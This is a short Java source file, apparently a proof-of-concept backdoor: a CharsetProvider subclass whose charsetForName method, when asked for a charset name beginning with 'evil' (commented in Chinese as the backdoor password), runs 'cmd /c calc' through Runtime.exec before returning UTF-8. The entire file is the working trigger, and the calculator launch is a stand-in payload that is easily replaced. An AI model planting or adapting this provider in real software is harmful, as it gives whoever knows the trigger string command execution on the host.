package sun.nio.cs.evil;

import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.spi.CharsetProvider;
import java.util.HashSet;
import java.util.Iterator;

public class CharsetEvil extends CharsetProvider{

    @Override
    public Iterator<Charset> charsets() {
        // TODO Auto-generated method stub
        return new HashSet<Charset>().iterator();
    }

    @Override
    public Charset charsetForName(String charsetName) {
        // TODO Auto-generated method stub
        if(charsetName.startsWith("evil")) {    //指定后门密码
            try {
                Runtime.getRuntime().exec("cmd /c calc");
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        return Charset.forName("UTF-8");
    }

}
